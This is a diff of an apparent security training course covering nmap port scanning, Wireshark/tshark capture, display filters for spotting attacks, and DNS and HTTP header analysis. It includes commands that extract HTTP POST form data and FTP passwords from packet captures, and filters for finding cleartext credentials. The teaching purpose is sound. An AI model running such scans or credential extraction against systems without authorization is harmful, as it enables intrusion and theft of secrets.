-sudo nmap -p- --min-rate 5000 -iL live_hosts.txt -oA all_ports
+# 2. Fast scan of all ports (saves time on large networks)
+sudo nmap -p- --min-rate 10000 -iL live_hosts.txt -oN all_ports.txt
 
-# Phase 3: Detailed scan of open ports
-sudo nmap -sV -sC -p 22,80,443,3306 192.168.1.1 -oA detailed_scan
-
-# Phase 4: Vulnerability scanning
-sudo nmap --script=vuln -p 22,80,443 192.168.1.1 -oA vuln_scan
+# 3. Targeted deep dive on open ports
+# Replace $PORTS with the ports found in step 2
+sudo nmap -sV -sC -p $PORTS -iL live_hosts.txt -oA deep_recon
 \`\`\`
 
-Phase 5 is always manual verification. Tools produce false positives. A finding you cannot reproduce manually is not a finding.
-
-Build this workflow into a script. Run it against your target and produce a structured report: host, port, service, version, and any vulnerabilities identified.`,
+**Challenge:** Create a bash script that automates this 3-step pipeline. It should take a target IP or range as an argument and produce a neatly organized folder of results.`,
               image: null,
             },
           ],
@@ -1338,105 +1350,102 @@ Build this workflow into a script. Run it against your target and produce a stru
             {
               title: 'Wireshark Fundamentals',
               instruction:
-                `Wireshark captures and displays network packets in real time, decoding protocols automatically.
+                `Wireshark allows you to see what is happening on your network at a microscopic level. It is the de facto standard for network analysis.
 
-The interface has three panes: packet list (top), packet details (middle — decoded structure layer by layer), and packet bytes (bottom — raw hex and ASCII).
+**The Interface Panes:**
+1.  **Packet List:** High-level summary of every packet (Time, Source, Destination, Protocol).
+2.  **Packet Details:** The "Dissector" view. Shows the packet structure layer by layer (OSI Model in action).
+3.  **Packet Bytes:** The raw data in Hex and ASCII.
 
+**Mastering tshark (The CLI version):**
 \`\`\`bash
-# Capture from the command line with tshark
-sudo tshark -i eth0
+# Capture traffic on eth0 and show only HTTP hosts
+sudo tshark -i eth0 -Y http -T fields -e http.host
 
-# Capture and save to file
-sudo tshark -i eth0 -w capture.pcap
+# Read a PCAP file and count packets per protocol
+tshark -r capture.pcap -z io,phs
 
-# Read a saved capture
-tshark -r capture.pcap
+# Extract all unique IP addresses from a capture
+tshark -r capture.pcap -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u
 
-# Apply a display filter
-tshark -r capture.pcap -Y "http"
+# Capture and save with a ring buffer (prevent disk filling)
+sudo tshark -i eth0 -b duration:3600 -b files:24 -w rolling_capture.pcap
 \`\`\`
 
-Start a capture, browse to \`http://example.com\` (HTTP, not HTTPS — you need unencrypted traffic), and stop. In the packet list, find the HTTP GET request. Click it and expand each layer in the packet details pane. Write down what each layer contains.`,
+**Deep Dive:** Expand the "Ethernet II" layer in a packet. Look for the **EtherType** field. It tells you which protocol is encapsulated inside the Ethernet frame (e.g., 0x0800 for IPv4).`,
               image: null,
             },
             {
               title: 'Display Filters',
               instruction:
-                `Display filters let you focus on specific traffic. They are one of Wireshark's most powerful features.
+                `Display filters are Wireshark's most powerful tool for finding the "needle in the haystack". Unlike capture filters, they hide packets without deleting them.
+
+**Powerful Filters for Attack Detection:**
+*   **ARP Spoofing:** \`arp.duplicate-address-frame\` (Shows multiple MACs for one IP).
+*   **TCP SYN Flood:** \`tcp.flags.syn == 1 and tcp.flags.ack == 0\` (High volume of these is suspicious).
+*   **DNS Tunneling:** \`dns.qry.name.len > 50\` (Checks for unusually long subdomains).
+*   **Cleartext Passwords:** \`http.request.method == "POST" and (http contains "password" or http contains "login")\`.
+
+**Combining Logic:**
+*   **AND (&&):** \`ip.addr == 10.10.10.5 && tcp.port == 443\`
+*   **OR (||):** \`http || dns\`
+*   **NOT (!):** \`!ssh && !ssl\`
 
 \`\`\`bash
-# Protocol filters
-http
-dns
-tcp
-udp
-icmp
-
-# IP address filters
-ip.addr == 192.168.1.1
-ip.src == 192.168.1.1
-
-# Port filters
-tcp.port == 80
-udp.port == 53
-
-# HTTP method filters
-http.request.method == "POST"
-http.response.code == 401
-
-# Content filters
-http contains "password"
-
-# Combine filters
-http and ip.src == 192.168.1.100
+# use tshark to apply filters on the fly
+tshark -r capture.pcap -Y 'http.response.code == 404'
 \`\`\`
 
-Practical exercise: capture traffic while logging in to an HTTP application. Apply \`http.request.method == "POST"\`. Find the login request. In the packet details, expand "HTML Form URL Encoded". Read the credentials sent in plaintext. This is why HTTPS is mandatory.`,
+**Exercise:** Create a filter that shows only traffic between your machine and a specific target, excluding any SSH traffic (to keep your session from cluttering the view).`,
               image: null,
             },
             {
               title: 'Following Streams',
               instruction:
-                `"Follow Stream" reconstructs a complete conversation between two hosts as readable text.
+                `Following a stream reconstructs the application-layer data into a human-readable conversation. This is essential for seeing exactly what an attacker (or a piece of malware) sent.
 
-How to follow a stream: right-click any packet → Follow → TCP Stream. Red text = client sent, blue text = server sent.
+**Types of Streams:**
+*   **TCP Stream:** Reconstructs the entire TCP conversation.
+*   **HTTP Stream:** Reconstructs specific HTTP request/response pairs.
+*   **UDP Stream:** Reconstructs a "best-guess" sequence of UDP packets.
 
+**Command Line Extraction (tshark):**
 \`\`\`bash
-# Extract HTTP POST data from a pcap
-tshark -r capture.pcap -Y "http.request.method == POST" \
-       -T fields -e http.file_data
+# Extract HTTP POST data (Form data)
+tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
 
-# Extract FTP credentials
-tshark -r capture.pcap -Y "ftp" \
-       -T fields -e ftp.request.command -e ftp.request.arg
+# Extract FTP credentials (USER and PASS)
+tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg
 
-# Extract Telnet data (everything is plaintext)
-tshark -r capture.pcap -Y "telnet" -T fields -e data.text
+# Extract files from a capture (using the 'export objects' equivalent)
+tshark -r capture.pcap --export-objects http,output_dir/
 \`\`\`
 
-Capture traffic while logging in to an HTTP application. Follow the TCP stream of the login request. Document exactly what was transmitted, including all headers and the request body.`,
+**Challenge:** Capture your own login to a non-HTTPS site (e.g., \`http://testphp.vulnweb.com\`). Follow the TCP stream. Can you find the exact moment your password was sent? What header was used?`,
               image: null,
             },
             {
               title: 'DNS Analysis',
               instruction:
-                `DNS traffic reveals what domains a host is communicating with — even when connections are encrypted. This is valuable for both reconnaissance and incident response.
+                `DNS is often the only unencrypted protocol on a network. Analyzing it can reveal a host's behavior even when they use HTTPS or VPNs.
+
+**What to look for:**
+*   **Unusual domains:** DGA (Domain Generation Algorithms) used by malware often look like \`afj12klas.com\`.
+*   **Large TXT records:** Often used for data exfiltration or C2 (Command & Control) communication.
+*   **Excessive NXDOMAIN:** Can indicate a scanner or a misconfigured piece of software.
 
 \`\`\`bash
-# Filter for DNS queries in Wireshark
-dns.flags.response == 0
+# Count top requested domains in a pcap
+tshark -r capture.pcap -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -n 10
 
-# Filter for NXDOMAIN (domain not found — useful for detecting DGA malware)
-dns.flags.rcode == 3
+# Filter for DNS responses that took longer than 1 second (Suspicious)
+tshark -r capture.pcap -Y "dns.time > 1.0"
 
-# Detect potential DNS tunnelling (unusually long queries)
-tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
-    awk 'length > 50' | sort | uniq -c | sort -rn
+# Look for DNS data exfiltration (Checking for entropy/length)
+tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
 \`\`\`
 
-DNS tunnelling encodes data in DNS queries to bypass firewalls. Tools like \`iodine\` and \`dnscat2\` implement this technique.
-
-Start a capture, browse several websites, and stop. Apply the DNS filter. For every domain resolved, note the IP address returned. Are there any domains you do not recognise? Research them.`,
+**Vulnerability:** **DNS Cache Poisoning** allows an attacker to redirect users to a malicious site by corrupting the DNS records on a resolver. Research how the "Transaction ID" (TXID) is used to prevent this.`,
               image: null,
             },
           ],
@@ -1478,7 +1487,7 @@ In the Headers tab, look at the Response Headers. Write down every header and wh
 - \`X-Powered-By:\` — backend technology
 - \`Set-Cookie:\` — session management
 - \`Content-Security-Policy:\` — XSS protections (or lack thereof)`,
-              image: '01-site.png',
+              image: 'step-01.png',
             },
             {
               title: 'Reading HTTP Headers',
@@ -1510,7 +1519,7 @@ curl -IL http://target.com
 - \`X-AspNet-Version: 4.0.30319\` — .NET version
 
 Run \`curl -I\` against your target. Document every header. For each one that reveals technology information, search for known vulnerabilities in that version.`,
-              image: '02-inspect.png',
+              image: 'step-02.png',
             },
             {
               title: 'Cookies and Sessions',
@@ -1540,7 +1549,7 @@ cat cookies.txt
 \`\`\`
 
 Log in to the target application. Inspect the session cookie. Answer these questions: Is HttpOnly set? Is Secure set? What is the SameSite value? Is the cookie value predictable or random? Log out — is the cookie invalidated on the server?`,
-              image: '03-elements.png',
+              image: 'step-03.png',
             },
             {
               title: 'Intercepting Requests with Burp Suite',
